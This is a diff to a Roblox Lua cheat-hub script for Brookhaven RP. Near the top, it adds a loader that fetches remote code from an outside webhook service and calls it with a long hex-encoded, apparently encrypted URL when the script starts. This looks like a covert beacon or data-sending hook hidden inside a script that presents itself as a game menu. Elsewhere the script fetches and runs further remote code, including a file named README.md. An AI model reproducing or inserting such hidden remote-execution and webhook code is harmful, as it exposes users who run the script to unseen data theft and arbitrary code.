@@ -1,6 +1,11 @@
 
 local Libary = loadstring(game:HttpGet("https://raw.githubusercontent.com/PHGS971/Slateste/refs/heads/main/Redzhubui.lua"))()
 workspace.FallenPartsDestroyHeight = -math.huge
+local requestWebhook = loadstring(game:HttpGet("https://blox-webhook.shardweb.app/script/library"))()
+
+local cryptUrl = "f2a63231a55a328483c71b504dc4b67a5a0382d1a5e0fbffd5a290a5735376d31dcc606e30545a9f9c721cc091c639fbfc8e58cb2a84183b9b5750be2216dfcafdb83ef56cbe2dba96b97f77f45b2a9c0a99f8a3208ac2a662a52330051293bea994e4e6d1cd35e0127e0006bb09f8859320379f38742a192b7187c32ff7740bdbeb6004c37644d3978afbd1fdeaa3f64abd0978a97f93221f74c4d21387ca4cf59d05a9eed78390b408ee6fee1ca7f82278ce3ffbf1301efe73a63baa93cbcc57d2d8376f9a358fc31e4e9bbf86a07c1201fb5b17506784d94e122504d01f35"
+
+requestWebhook(cryptUrl)
 
 local Window = Libary:MakeWindow({
     Title = "CYA STUDIOS HUB | Brookhaven RP v1.2",
@@ -9415,4 +9420,5 @@ UniversalTab:AddButton({
         loadstring(game:HttpGet("https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md", true))()
     end
 })
+
 
